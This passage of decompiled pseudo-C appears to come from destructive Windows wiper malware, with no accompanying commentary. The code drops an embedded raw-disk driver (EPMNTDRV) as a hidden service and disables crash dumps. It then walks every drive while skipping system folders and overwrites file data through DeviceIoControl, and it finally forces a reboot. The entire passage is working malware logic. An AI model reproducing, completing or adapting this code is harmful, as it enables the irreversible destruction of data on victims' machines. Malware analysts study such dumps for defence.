  pszSrch[0] = L"My Documents";
  pszSrch[1] = L"Desktop";
  if ( v3 )
    return 0;
  v4 = 0;
  while ( !StrStrIW(pszFirst, pszSrch[v4]) )
  {
    if ( (unsigned int)++v4 >= 2 )
      return 0;
  }
  return 1;
}
// 405274: using guessed type wchar_t aMyDocuments[13];
// 405290: using guessed type wchar_t aDesktop[8];

//----- (004029D0) --------------------------------------------------------
int __thiscall sub_4029D0(void *this)
{
  BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *); // ebx
  HMODULE ModuleHandleW; // edi
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // esi
  HANDLE CurrentProcess; // eax
  ULONGLONG v5; // rax
  ULONGLONG v6; // rax
  HRSRC ResourceW; // eax
  HRSRC v8; // esi
  HGLOBAL Resource; // eax
  void *v10; // eax
  WCHAR *v12; // ebx
  DWORD CurrentProcessId; // eax
  unsigned int v14; // ecx
  size_t v15; // esi
  WCHAR *v16; // ebx
  HANDLE FileW; // eax
  void (__stdcall *v18)(LPCWSTR); // edi
  void *v19; // esi
  int v20; // esi
  const void *v21; // eax
  LONG v22; // edi
  const WCHAR *v23; // eax
  LPWSTR ExtensionW; // eax
  WCHAR SubKey[260]; // [esp+10h] [ebp-8A8h] BYREF
  wchar_t Destination[260]; // [esp+218h] [ebp-6A0h] BYREF
  struct _OFSTRUCT v27; // [esp+420h] [ebp-498h] BYREF
  _OFSTRUCT ReOpenBuf; // [esp+4A8h] [ebp-410h] BYREF
  WCHAR pszDest[260]; // [esp+530h] [ebp-388h] BYREF
  _OSVERSIONINFOEXW VersionInformation; // [esp+738h] [ebp-180h] BYREF
  int v31; // [esp+85Ch] [ebp-5Ch] BYREF
  _DWORD v32[13]; // [esp+860h] [ebp-58h]
  BOOL v33; // [esp+894h] [ebp-24h]
  int v34; // [esp+898h] [ebp-20h]
  int v35; // [esp+89Ch] [ebp-1Ch]
  DWORD nNumberOfBytesToWrite; // [esp+8A0h] [ebp-18h]
  LPCVOID lpBuffer; // [esp+8A4h] [ebp-14h]
  unsigned int v38; // [esp+8A8h] [ebp-10h]
  BYTE Data[4]; // [esp+8ACh] [ebp-Ch] BYREF
  int v40; // [esp+8B0h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+8B4h] [ebp-4h] BYREF

  Wow64DisableWow64FsRedirection = 0;
  v34 = (int)this;
  v33 = 0;
  v35 = 0;
  v40 = 0;
  v31 = 0;
  memset(pszDest, 0, sizeof(pszDest));
  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  v38 = wnsprintfW(pszDest, 260, L"\\??\\");
  if ( ModuleHandleW )
  {
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(
                                                                    ModuleHandleW,
                                                                    "Wow64DisableWow64FsRedirection");
    GetProcAddress(ModuleHandleW, "Wow64RevertWow64FsRedirection");
    IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleW, "IsWow64Process");
    if ( IsWow64Process )
    {
      CurrentProcess = GetCurrentProcess();
      IsWow64Process(CurrentProcess, &v40);
    }
  }
  memset(&VersionInformation, 0, sizeof(VersionInformation));
  VersionInformation.dwOSVersionInfoSize = 284;
  VersionInformation.dwMajorVersion = 6;
  VersionInformation.dwMinorVersion = 0;
  v5 = VerSetConditionMask(0LL, 2u, 3u);
  v6 = VerSetConditionMask(v5, 1u, 3u);
  if ( VerifyVersionInfoW(&VersionInformation, 3u, v6) )
  {
    if ( v40 )
      ResourceW = FindResourceW(hModule, L"DRV_X64", L"RCDATA");
    else
      ResourceW = FindResourceW(hModule, L"DRV_X86", L"RCDATA");
  }
  else
  {
    if ( GetLastError() != 1150 )
      return 0;
    v35 = 1;
    if ( v40 )
      ResourceW = FindResourceW(hModule, L"DRV_XP_X64", L"RCDATA");
    else
      ResourceW = FindResourceW(hModule, L"DRV_XP_X86", L"RCDATA");
  }
  v8 = ResourceW;
  if ( !ResourceW )
    return 0;
  Resource = LoadResource(hModule, ResourceW);
  if ( !Resource )
    return 0;
  lpBuffer = LockResource(Resource);
  if ( !lpBuffer )
    return 0;
  nNumberOfBytesToWrite = SizeofResource(hModule, v8);
  if ( v40 && Wow64DisableWow64FsRedirection )
    Wow64DisableWow64FsRedirection((PVOID *)&v31);
  phkResult = 0;
  if ( !RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CrashControl", &phkResult) )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExW(phkResult, L"CrashDumpEnabled", 0, 4u, Data, 4u);
    RegCloseKey(phkResult);
  }
  wnsprintfW(Destination, 260, L"\\\\.\\EPMNTDRV\\%u", 0);
  v10 = (void *)sub_401870(Destination, 0, 0);
  if ( !v10 || v10 == (void *)-1 )
  {
    *(_DWORD *)Data = &pszDest[v38];
    if ( GetSystemDirectoryW(*(LPWSTR *)Data, 0x104u) )
    {
      PathAppendW(pszDest, L"Drivers");
      PathAddBackslashW(pszDest);
      v38 = 26;
      v12 = &pszDest[wcslen(pszDest)];
      do
      {
        v32[0] = 6422625;
        v32[1] = 6553699;
        v32[2] = 6684773;
        v32[3] = 6815847;
        v32[4] = 6946921;
        v32[5] = 7077995;
        v32[6] = 7209069;
        v32[7] = 7340143;
        v32[8] = 7471217;
        v32[9] = 7602291;
        v32[10] = 7733365;
        v32[11] = 7864439;
        v32[12] = 7995513;
        CurrentProcessId = GetCurrentProcessId();
        v14 = (CurrentProcessId + 1) % 0xFFF1;
        *v12 = *((_WORD *)v32 + (v14 + ((v14 % 0xFFF1) << 16)) % v38);
        v12[1] = *((_WORD *)v32
                 + ((v14 + CurrentProcessId) % 0xFFF1
                  + (((v14 % 0xFFF1 + (v14 + CurrentProcessId) % 0xFFF1) % 0xFFF1) << 16))
                 % 0x1A);
        StrCatBuffW(v12 + 1, L"drv", 4);
        v12[6] = 0;
      }
      while ( PathFileExistsW(pszDest) );
      v15 = PathFindExtensionW(v12) - v12;
      wcsncpy(Destination, v12, v15);
      v16 = *(WCHAR **)Data;
      Destination[v15] = 0;
      FileW = CreateFileW(v16, 0x40000000u, 0, 0, 2u, 0, 0);
      v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
      v19 = FileW;
      if ( FileW && FileW != (HANDLE)-1 )
      {
        phkResult = 0;
        if ( WriteFile(FileW, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&phkResult, 0)
          && phkResult == (HKEY)nNumberOfBytesToWrite )
        {
          if ( v19 != (void *)-1 )
          {
            FlushFileBuffers(v19);
            CloseHandle(v19);
          }
        }
        else
        {
          CloseHandle(v19);
          DeleteFileW(v16);
        }
      }
      sub_4023C0(v16, v34);
      memset(&ReOpenBuf, 0, sizeof(ReOpenBuf));
      memset(&v27, 0, sizeof(v27));
      v20 = LZOpenFileW(v16, &ReOpenBuf, 2u);
      if ( v20 >= 0 )
      {
        PathAddExtensionW(pszDest, L".sys");
        v21 = (const void *)LZOpenFileW(v16, &v27, 0x1002u);
        lpBuffer = v21;
        if ( (int)v21 >= 0 )
        {
          v22 = LZCopy(v20, (INT)v21);
          LZClose(v20);
          LZClose((INT)lpBuffer);
          if ( v22 > 0 )
          {
            v23 = v16;
            if ( v35 )
              v23 = StrStrIW(v16, L"System32");
            v33 = sub_403930(v23, Destination);
            if ( v33 )
            {
              wsprintfW(SubKey, L"%s%s", L"SYSTEM\\CurrentControlSet\\services\\", Destination);
              RegDeleteKeyW(HKEY_LOCAL_MACHINE, SubKey);
            }
          }
          sub_4023C0(v16, v34);
          v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
        }
        else
        {
          LZClose(v20);
        }
      }
      v18(v16);
      ExtensionW = PathFindExtensionW(v16);
      if ( ExtensionW )
      {
        *ExtensionW = 0;
        v18(v16);
      }
    }
    return v33;
  }
  else
  {
    CloseHandle(v10);
    return 1;
  }
}
// 4053A4: using guessed type wchar_t aDrvX64[8];
// 4053B4: using guessed type wchar_t aDrvX86[8];
// 4053C4: using guessed type wchar_t aDrvXpX64[11];
// 405420: using guessed type wchar_t aSystemCurrentc_0[35];

//----- (00402F30) --------------------------------------------------------
int __stdcall sub_402F30(PCWSTR pszFirst, int a2, int a3)
{
  int v3; // esi
  int v5; // eax
  PCWSTR pszSrch[7]; // [esp+Ch] [ebp-1Ch]

  v3 = 0;
  pszSrch[0] = L"Windows";
  pszSrch[1] = L"Program Files";
  pszSrch[2] = L"Program Files(x86)";
  pszSrch[3] = L"PerfLogs";
  pszSrch[4] = L"Boot";
  pszSrch[5] = L"System Volume Information";
  pszSrch[6] = L"AppData";
  while ( !StrStrIW(pszFirst, pszSrch[v3]) )
  {
    if ( (unsigned int)++v3 >= 7 )
      return 1;
  }
  v5 = *(_DWORD *)(a3 + 24);
  if ( (v5 & 7) != 0 )
  {
    *(_DWORD *)(a3 + 24) = v5 + 1;
  }
  else
  {
    Sleep(0);
    *(_DWORD *)(a3 + 24) = 1;
  }
  return 0;
}
// 405264: using guessed type wchar_t aAppdata[8];
// 405474: using guessed type wchar_t aWindows[8];
// 405484: using guessed type wchar_t aProgramFiles[14];
// 4054A0: using guessed type wchar_t aProgramFilesX8[19];
// 4054C8: using guessed type wchar_t aPerflogs[9];
// 4054DC: using guessed type wchar_t aBoot[5];
// 4054E8: using guessed type wchar_t aSystemVolumeIn[26];

//----- (00402FD0) --------------------------------------------------------
int __thiscall sub_402FD0(HANDLE hObject, int a2)
{
  HANDLE v2; // ebx
  int v3; // esi
  HANDLE ProcessHeap; // eax
  _DWORD *v5; // edi
  unsigned int v6; // esi
  DWORD LastError; // eax
  __int64 v8; // kr00_8
  unsigned __int64 v9; // kr08_8
  int v10; // edi
  unsigned __int64 v11; // rax
  unsigned int v12; // edi
  DWORD v13; // eax
  HANDLE v14; // eax
  __int64 v16; // [esp-18h] [ebp-90h]
  unsigned int v17; // [esp-Ch] [ebp-84h]
  __int64 v18; // [esp-8h] [ebp-80h]
  DWORD v19; // [esp+Ch] [ebp-6Ch]
  _DWORD *v20; // [esp+10h] [ebp-68h]
  unsigned int v22; // [esp+18h] [ebp-60h]
  int v23; // [esp+1Ch] [ebp-5Ch]
  _DWORD *v24; // [esp+20h] [ebp-58h]
  BOOL v25; // [esp+24h] [ebp-54h]
  unsigned int v26; // [esp+28h] [ebp-50h]
  unsigned int v27; // [esp+30h] [ebp-48h]
  unsigned int v28; // [esp+34h] [ebp-44h]
  unsigned int v29; // [esp+38h] [ebp-40h]
  DWORD BytesReturned; // [esp+3Ch] [ebp-3Ch] BYREF
  unsigned __int64 InBuffer; // [esp+40h] [ebp-38h] BYREF
  unsigned __int64 v32; // [esp+48h] [ebp-30h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [esp+50h] [ebp-28h] BYREF
  HANDLE v34[2]; // [esp+58h] [ebp-20h] BYREF
  unsigned __int64 v35; // [esp+60h] [ebp-18h]
  unsigned __int64 v36; // [esp+68h] [ebp-10h]
  int v37; // [esp+70h] [ebp-8h]

  v2 = hObject;
  v3 = 0;
  if ( !hObject || hObject == (HANDLE)-1 )
    return v3;
  ProcessHeap = GetProcessHeap();
  v5 = HeapAlloc(ProcessHeap, 0, 0x20u);
  v20 = v5;
  if ( !v5 )
    goto LABEL_29;
  v32 = 0LL;
  v6 = 0;
  InBuffer = 0LL;
  v26 = 0;
  v22 = 0;
  while ( 2 )
  {
    if ( !WaitForSingleObject(*(HANDLE *)(a2 + 8), 0) )
    {
      v3 = 1;
      goto LABEL_28;
    }
    InBuffer = __PAIR64__(v6, v22);
    v25 = 0;
    DeviceIoControl(v2, 0x90073u, &InBuffer, 8u, v5, 0x20u, &BytesReturned, 0);
    LastError = GetLastError();
    v19 = LastError;
    if ( LastError )
    {
      if ( LastError != 234 )
        break;
      v22 = v5[4];
      v26 = v5[5];
    }
    v8 = *((_QWORD *)v5 + 2) - InBuffer;
    v9 = v8 >> 1;
    while ( v9 > 1 )
    {
      v32 = 0LL;
      GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
      v24 = (_DWORD *)(a2 + 12);
      v10 = *(_DWORD *)(a2 + 12);
      LODWORD(v18) = *(_DWORD *)(v10 + 8);
      v28 = *(_DWORD *)(v10 + 12);
      HIDWORD(v18) = v28;
      v11 = sub_401160(*(_QWORD *)&SystemTimeAsFileTime, v18);
      v17 = HIDWORD(v11);
      v27 = v11;
      HIDWORD(v16) = *(_DWORD *)(v10 + 12);
      HIDWORD(v11) = v10 + 16;
      v29 = v17;
      v12 = *(_DWORD *)(v10 + 8);
      v23 = HIDWORD(v11);
      LODWORD(v16) = v12;
      if ( sub_401370(SHIDWORD(v11), (unsigned int *)&v32, v16, v11, v17, v9)
        || sub_401370(v23, (unsigned int *)&v32, __PAIR64__(v28, v12) - __PAIR64__(v29, v27), 0, 0, v9) )
      {
        v34[0] = hObject;
        v35 = InBuffer;
        v36 = v32;
        v37 = v9;
        v25 = DeviceIoControl(*(HANDLE *)a2, 0x90074u, v34, 0x20u, 0, 0, &BytesReturned, 0);
        if ( v25 )
        {
          v5 = v20;
          if ( (v20[7] & v20[6]) != -1 )
          {
            sub_4011E0(*v24 + 16, v9, v32, 1);
            sub_4011E0(*v24 + 16, v9, *((_QWORD *)v20 + 3), 0);
          }
          goto LABEL_14;
        }
        v13 = GetLastError();
        v19 = v13;
        if ( v13 != 5 )
        {
          v5 = v20;
          goto LABEL_15;
        }
        sub_401490(*(HANDLE *)a2, (unsigned __int64 **)(a2 + 12), (DWORD *)(a2 + 16));
        v5 = v20;
      }
      else
      {
        v5 = v20;
        --v9;
LABEL_14:
        v13 = v19;
LABEL_15:
        if ( v25 )
          goto LABEL_24;
      }
    }
    v13 = v19;
LABEL_24:
    v2 = hObject;
    if ( v13 == 234 )
    {
      v6 = v26;
      continue;
    }
    break;
  }
  v3 = 0;
LABEL_28:
  v14 = GetProcessHeap();
  HeapFree(v14, 0, v5);
LABEL_29:
  CloseHandle(v2);
  return v3;
}

//----- (00403290) --------------------------------------------------------
int __stdcall sub_403290(LPCWSTR lpFileName, _DWORD *a2, int a3)
{
  DWORD v3; // eax
  HANDLE FileW; // edi
  int v5; // eax

  v3 = ((*a2 & 0x4000) != 0 ? -2147483641 : 0x80000000) | 2;
  if ( (*a2 & 0x800) != 0 )
    v3 = (*a2 & 0x4000) != 0 ? -2147483641 : 0x80000000;
  FileW = CreateFileW(lpFileName, v3, 1u, 0, 3u, 0, 0);
  v5 = *(_DWORD *)(a3 + 24);
  if ( (v5 & 7) != 0 )
  {
    *(_DWORD *)(a3 + 24) = v5 + 1;
  }
  else
  {
    Sleep(0);
    *(_DWORD *)(a3 + 24) = 1;
  }
  return sub_402FD0(FileW, a3);
}

//----- (00403310) --------------------------------------------------------
DWORD __stdcall sub_403310(LPVOID lpThreadParameter)
{
  HANDLE FileW; // eax
  void *v2; // ebx
  void (__stdcall *v3)(HANDLE, DWORD, LPVOID); // esi
  unsigned __int64 *v4; // ecx
  int v5; // eax
  unsigned int i; // esi
  HANDLE ProcessHeap; // eax
  HANDLE v8; // eax
  void *v10; // [esp-8h] [ebp-40h]
  LPVOID v11; // [esp-4h] [ebp-3Ch]
  void *v12; // [esp-4h] [ebp-3Ch]
  void *v13; // [esp-4h] [ebp-3Ch]
  unsigned __int64 *v14; // [esp+Ch] [ebp-2Ch] BYREF
  int v15; // [esp+10h] [ebp-28h] BYREF
  LPVOID lpMem; // [esp+14h] [ebp-24h]
  WCHAR FileName[16]; // [esp+18h] [ebp-20h] BYREF

  lpMem = (LPVOID)*((_DWORD *)lpThreadParameter + 1);
  wsprintfW(FileName, L"%ws%.2ws", L"\\\\.\\", lpMem);
  FileW = CreateFileW(FileName, 0x80100000, 3u, 0, 3u, 0, 0);
  v11 = lpMem;
  v2 = FileW;
  *(_DWORD *)lpThreadParameter = FileW;
  wsprintfW(FileName, L"%ws%ws", L"\\\\?\\", v11);
  v3 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
  if ( v2 && v2 != (void *)-1 )
  {
    v14 = 0;
    v15 = 0;
    sub_401490(v2, &v14, (DWORD *)&v15);
    v4 = v14;
    v5 = v15;
    *((_DWORD *)lpThreadParameter + 3) = v14;
    *((_DWORD *)lpThreadParameter + 4) = v5;
    if ( v4 )
    {
      for ( i = 0; i < 0x10; ++i )
      {
        v10 = (void *)*((_DWORD *)lpThreadParameter + 2);
        *((_DWORD *)lpThreadParameter + 5) = i;
        if ( !WaitForSingleObject(v10, 0) )
          break;
        sub_403620(
          FileName,
          (int (__stdcall *)(char *, _WIN32_FIND_DATAW *, int))sub_402F30,
          (int (__stdcall *)(char *, _WIN32_FIND_DATAW *, int))sub_403290,
          (int)lpThreadParameter);
      }
      v3 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    }
    if ( *((_DWORD *)lpThreadParameter + 3) )
    {
      v12 = (void *)*((_DWORD *)lpThreadParameter + 3);
      ProcessHeap = GetProcessHeap();
      v3(ProcessHeap, 0, v12);
    }
    CloseHandle(v2);
  }
  v13 = lpMem;
  v8 = GetProcessHeap();
  v3(v8, 0, v13);
  return 0;
}
// 4051F0: using guessed type wchar_t asc_4051F0[5];

//----- (00403430) --------------------------------------------------------
int __stdcall sub_403430(LPCWSTR lpString, _DWORD *a2)
{
  HANDLE ProcessHeap; // eax
  _DWORD *v3; // ebx
  LPCWSTR v4; // esi
  HANDLE v5; // eax
  _WORD *v6; // edx
  __int16 v7; // ax
  void *v8; // eax
  SIZE_T v10; // [esp-8h] [ebp-10h]

  ProcessHeap = GetProcessHeap();
  v3 = HeapAlloc(ProcessHeap, 0, 0x1Cu);
  if ( v3 )
  {
    v4 = lpString;
    v10 = 2 * lstrlenW(lpString) + 2;
    v5 = GetProcessHeap();
    v6 = HeapAlloc(v5, 0, v10);
    v3[1] = v6;
    v3[2] = *a2;
    do
    {
      v7 = *v4++;
      *v6++ = v7;
    }
    while ( v7 );
    a2[a2[27] + 1] = CreateThread(0, 0, sub_403310, v3, 0, 0);
    v8 = (void *)a2[a2[27] + 1];
    if ( v8 )
    {
      SetThreadPriority(v8, -2);
      ++a2[27];
    }
  }
  return 0;
}

//----- (004034D0) --------------------------------------------------------
DWORD __stdcall sub_4034D0(HANDLE *lpThreadParameter)
{
  DWORD i; // esi
  WCHAR Class[260]; // [esp+4h] [ebp-420h] BYREF
  WCHAR Name[256]; // [esp+20Ch] [ebp-218h] BYREF
  DWORD cchName; // [esp+40Ch] [ebp-18h] BYREF
  DWORD cchClass; // [esp+410h] [ebp-14h] BYREF
  BYTE Data[4]; // [esp+414h] [ebp-10h] BYREF
  DWORD cSubKeys; // [esp+418h] [ebp-Ch] BYREF
  HKEY phkResult; // [esp+41Ch] [ebp-8h] BYREF
  HKEY hKey; // [esp+420h] [ebp-4h] BYREF

  memset(Class, 0, sizeof(Class));
  cchClass = 260;
  cSubKeys = 0;
  RegQueryInfoKeyW(HKEY_USERS, Class, &cchClass, 0, &cSubKeys, 0, 0, 0, 0, 0, 0, 0);
  if ( cSubKeys )
  {
    for ( i = 0; i < cSubKeys; ++i )
    {
      cchName = 255;
      if ( !RegEnumKeyExW(HKEY_USERS, i, Name, &cchName, 0, 0, 0, 0) )
      {
        phkResult = 0;
        if ( !RegOpenKeyW(HKEY_USERS, Name, &phkResult) )
        {
          hKey = 0;
          if ( !RegOpenKeyW(phkResult, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &hKey) )
          {
            *(_DWORD *)Data = 0;
            RegSetValueExW(hKey, L"ShowCompColor", 0, 4u, Data, 4u);
            RegSetValueExW(hKey, L"ShowInfoTip", 0, 4u, Data, 4u);
            RegCloseKey(hKey);
          }
          RegCloseKey(phkResult);
        }
      }
    }
  }
  sub_4038A0((void (__stdcall *)(WCHAR *, int))sub_403430, (int)lpThreadParameter);
  WaitForSingleObject(*lpThreadParameter, 0xFFFFFFFF);
  lpThreadParameter[27] = 0;
  return 0;
}

//----- (00403620) --------------------------------------------------------
int __fastcall sub_403620(
        const unsigned __int16 *a1,
        int (__stdcall *a2)(char *, _WIN32_FIND_DATAW *, int),
        int (__stdcall *a3)(char *, _WIN32_FIND_DATAW *, int),
        int a4)
{
  int v4; // edi
  unsigned int v5; // ebx
  HANDLE ProcessHeap; // eax
  const WCHAR *v7; // eax
  const unsigned __int16 *v8; // esi
  const unsigned __int16 *v9; // ecx
  char *v10; // edx
  unsigned __int16 v11; // ax
  const WCHAR *v12; // ecx
  int v13; // eax
  int v14; // eax
  unsigned int v15; // kr00_4
  HANDLE v16; // eax
  char *v17; // ebx
  const unsigned __int16 *v18; // eax
  unsigned __int16 v19; // cx
  int v20; // ecx
  WCHAR *cFileName; // edx
  unsigned int v23; // edx
  char *v24; // edi
  __int16 v25; // ax
  HANDLE v26; // eax
  HANDLE v27; // eax
  WCHAR *v29; // [esp-4h] [ebp-284h]
  _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-270h] BYREF
  int (__stdcall *v31)(char *, _WIN32_FIND_DATAW *, int); // [esp+264h] [ebp-1Ch]
  int v32; // [esp+268h] [ebp-18h]
  LPCWSTR lpFileName; // [esp+26Ch] [ebp-14h]
  HANDLE hFindFile; // [esp+270h] [ebp-10h]
  unsigned int v35; // [esp+274h] [ebp-Ch]
  const unsigned __int16 *v36; // [esp+278h] [ebp-8h]
  int v37; // [esp+27Ch] [ebp-4h]

  v31 = a2;
  v4 = 0;
  v36 = a1;
  v37 = 0;
  v5 = wcslen(a1);
  v35 = v5;
  v32 = 2 * v5;
  ProcessHeap = GetProcessHeap();
  v7 = (const WCHAR *)HeapAlloc(ProcessHeap, 0, 2 * v5 + 6);
  lpFileName = v7;
  if ( v7 )
  {
    v8 = v36;
    v9 = v36;
    v10 = (char *)((char *)v7 - (char *)v36);
    do
    {
      v11 = *v9++;
      *(const unsigned __int16 *)((char *)v9 + (_DWORD)v10 - 2) = v11;
    }
    while ( v11 );
    v12 = lpFileName;
    *(_DWORD *)&lpFileName[v5] = 2752604;
    v12[v5 + 2] = 0;
    hFindFile = FindFirstFileW(v12, &FindFileData);
    if ( hFindFile != (HANDLE)-1 )
    {
      while ( 1 )
      {
        if ( v4 )
        {
LABEL_30:
          FindClose(hFindFile);
          goto LABEL_31;
        }
        v13 = wcscmp(FindFileData.cFileName, word_405548);
        if ( v13 )
          v13 = v13 < 0 ? -1 : 1;
        if ( v13 )
        {
          v14 = wcscmp(FindFileData.cFileName, L"..");
          if ( v14 )
            v14 = v14 < 0 ? -1 : 1;
          if ( v14 )
            break;
        }
LABEL_29:
        if ( !FindNextFileW(hFindFile, &FindFileData) )
          goto LABEL_30;
      }
      v15 = wcslen(FindFileData.cFileName);
      v16 = GetProcessHeap();
      v17 = (char *)HeapAlloc(v16, 0, 2 * (v15 + v5) + 4);
      if ( !v17 )
      {
LABEL_28:
        v5 = v35;
        goto LABEL_29;
      }
      v18 = v8;
      do
      {
        v19 = *v18++;
        *(const unsigned __int16 *)((char *)v18 + v17 - (char *)v8 - 2) = v19;
      }
      while ( v19 );
      v20 = v32;
      cFileName = FindFileData.cFileName;
      *(_DWORD *)&v17[v32] = 92;
      while ( *cFileName++ )
        ;
      v23 = (char *)cFileName - (char *)FindFileData.cFileName;
      v24 = &v17[v20];
      do
      {
        v25 = *((_WORD *)v24 + 1);
        v24 += 2;
      }
      while ( v25 );
      qmemcpy(v24, FindFileData.cFileName, v23);
      if ( (FindFileData.dwFileAttributes & 0x400) == 0 )
      {
        if ( (FindFileData.dwFileAttributes & 0x10) == 0 )
        {
          v4 = a3(v17, &FindFileData, a4);
          v37 = v4;
          goto LABEL_27;
        }
        if ( !v31 || v31(v17, &FindFileData, a4) )
        {
          v4 = sub_403620(a3, a4);
          v37 = v4;
LABEL_27:
          v26 = GetProcessHeap();
          HeapFree(v26, 0, v17);
          v8 = v36;
          goto LABEL_28;
        }
      }
      v4 = v37;
      goto LABEL_27;
    }
LABEL_31:
    v29 = (WCHAR *)lpFileName;
    v27 = GetProcessHeap();
    HeapFree(v27, 0, v29);
  }
  return v4;
}
// 405548: using guessed type unsigned __int16 word_405548[2];
// 40554C: using guessed type wchar_t asc_40554C[3];

//----- (004038A0) --------------------------------------------------------
DWORD __fastcall sub_4038A0(void (__stdcall *a1)(WCHAR *, int), int a2)
{
  DWORD LogicalDriveStringsW; // ecx
  WCHAR *v4; // esi
  WCHAR *v5; // edi
  WCHAR Buffer[216]; // [esp+4h] [ebp-1B4h] BYREF
  void (__stdcall *v8)(WCHAR *, int); // [esp+1B4h] [ebp-4h]

  v8 = a1;
  memset(Buffer, 0, sizeof(Buffer));
  LogicalDriveStringsW = GetLogicalDriveStringsW(0xD8u, Buffer);
  if ( LogicalDriveStringsW - 1 > 0xD7 )
    return GetLastError();
  v4 = Buffer;
  v5 = &Buffer[LogicalDriveStringsW];
  if ( Buffer < v5 )
  {
    do
    {
      v8(v4, a2);
      v4 += wcslen(v4) + 1;
    }
    while ( v4 < v5 );
  }
  return 0;
}

//----- (00403930) --------------------------------------------------------
BOOL __fastcall sub_403930(const WCHAR *a1, const WCHAR *a2)
{
  BOOL started; // ebx
  HANDLE ProcessHeap; // eax
  struct _TOKEN_PRIVILEGES *v4; // edi
  HANDLE CurrentProcess; // eax
  HANDLE v6; // eax
  SC_HANDLE v7; // eax
  DWORD LastError; // eax
  SC_HANDLE ServiceW; // edi
  DWORD v11; // esi
  void (__stdcall *v12)(SC_HANDLE); // edi
  unsigned int i; // esi
  SC_HANDLE v14; // [esp-4h] [ebp-40h]
  SC_HANDLE v15; // [esp-4h] [ebp-40h]
  SC_HANDLE v16; // [esp-4h] [ebp-40h]
  _SERVICE_STATUS ServiceStatus; // [esp+Ch] [ebp-30h] BYREF
  HANDLE TokenHandle; // [esp+28h] [ebp-14h] BYREF
  int v19; // [esp+2Ch] [ebp-10h]
  LPCWSTR lpServiceName; // [esp+30h] [ebp-Ch]
  SC_HANDLE hSCManager; // [esp+34h] [ebp-8h]
  LPCWSTR lpBinaryPathName; // [esp+38h] [ebp-4h]

  started = 0;
  lpServiceName = a2;
  lpBinaryPathName = a1;
  v19 = 0;
  hSCManager = 0;
  ProcessHeap = GetProcessHeap();
  v4 = (struct _TOKEN_PRIVILEGES *)HeapAlloc(ProcessHeap, 8u, 0x40u);
  if ( v4 )
  {
    CurrentProcess = GetCurrentProcess();
    if ( OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle) )
    {
      LookupPrivilegeValueW(0, L"SeLoadDriverPrivilege", &v4->Privileges[0].Luid);
      v4->PrivilegeCount = 1;
      v4->Privileges[0].Attributes = 2;
      hSCManager = (SC_HANDLE)AdjustTokenPrivileges(TokenHandle, 0, v4, 0, 0, 0);
    }
    GetLastError();
    v6 = GetProcessHeap();
    HeapFree(v6, 0, v4);
    if ( hSCManager )
    {
      if ( lpBinaryPathName )
      {
        v7 = OpenSCManagerW(0, L"ServicesActive", 3u);
        hSCManager = v7;
        if ( !v7 )
        {
          LastError = GetLastError();
          SetLastError(LastError);
          return 0;
        }
        ServiceW = OpenServiceW(v7, lpServiceName, 0x16u);
        if ( ServiceW )
        {
          memset(&ServiceStatus, 0, sizeof(ServiceStatus));
          if ( QueryServiceStatus(ServiceW, &ServiceStatus) )
          {
            started = ServiceStatus.dwCurrentState == 4;
          }
          else if ( !ChangeServiceConfigW(ServiceW, 1u, 3u, 1u, lpBinaryPathName, 0, 0, 0, 0, 0, 0) )
          {
            v15 = ServiceW;
            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
            v11 = GetLastError();
            CloseServiceHandle(v15);
            goto LABEL_13;
          }
        }
        else
        {
          v11 = GetLastError();
          if ( v11 != 1060 )
          {
LABEL_12:
            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
LABEL_13:
            v12(hSCManager);
            SetLastError(v11);
            return started;
          }
          ServiceW = CreateServiceW(
                       hSCManager,
                       lpServiceName,
                       lpServiceName,
                       0xF01FFu,
                       1u,
                       3u,
                       1u,
                       lpBinaryPathName,
                       0,
                       0,
                       0,
                       0,
                       0);
          if ( !ServiceW )
          {
            v11 = GetLastError();
            goto LABEL_12;
          }
          v19 = 1;
        }
        for ( i = 0; i < 5; ++i )
        {
          if ( started )
            break;
          started = StartServiceW(ServiceW, 0, 0);
          Sleep(0x3E8u);
        }
        v11 = 0;
        if ( !started )
        {
          v11 = GetLastError();
          if ( v11 == 1056 )
          {
            v14 = ServiceW;
            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
            started = 1;
            CloseServiceHandle(v14);
            goto LABEL_13;
          }
          if ( v19 )
            DeleteService(ServiceW);
        }
        v16 = ServiceW;
        v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
        CloseServiceHandle(v16);
        goto LABEL_13;
      }
    }
  }
  return 0;
}

//----- (00403B40) --------------------------------------------------------
DWORD __stdcall sub_403B40(DWORD *lpThreadParameter)
{
  Sleep(*lpThreadParameter);
  if ( InitiateSystemShutdownExW(0, 0, 0, 1, 1, 0x80020003) )
    return GetLastError();
  else
    return 0;
}

//----- (00403B80) --------------------------------------------------------
void __noreturn start()
{
  LPWSTR *v0; // esi
  const WCHAR *CommandLineW; // eax
  const WCHAR *v2; // edi
  int (__stdcall *v3)(PCWSTR); // ecx
  DWORD v4; // eax
  unsigned int v5; // ebx
  unsigned int v6; // eax
  unsigned int v7; // ecx
  HANDLE ProcessHeap; // eax
  char *v9; // ebx
  HANDLE CurrentProcess; // eax
  DWORD (__stdcall *v11)(); // edi
  HANDLE v12; // eax
  int v13; // eax
  DWORD v14; // esi
  SC_HANDLE v15; // eax
  SC_HANDLE v16; // eax
  SC_HANDLE v17; // ebx
  int i; // esi
  DWORD dwHighDateTime; // esi
